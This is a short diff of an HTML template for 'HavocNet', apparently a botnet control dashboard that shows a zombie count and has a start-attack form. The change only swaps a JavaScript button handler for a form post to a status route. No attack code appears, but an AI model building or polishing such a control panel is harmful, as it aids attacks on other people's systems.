@@ -146,8 +146,8 @@
         <h1>HavocNet</h1>
     </div>
     <div class="zombie-bar">
-        <h2>Zombie Count: {{number}}</h2>
-        <button onclick="checkStatus()">Check Status</button>
+        <h2>Zombie Count : {{number}}</h2>
+        <form action="{{ url_for('check_status') }}" method="post"><button >Check Status</button></form>
     </div>
     <div class="dashboard-container">
         <form action="{{ url_for('start_attack') }}" method="post">
@@ -165,10 +165,5 @@
             <p class="error-message" id="error-message">{{ error }}</p>
         </form>
     </div>
-    <script>
-        function checkStatus() {
-            console.log("Check Status button clicked");
-        }
-    </script>
 </body>
 </html>
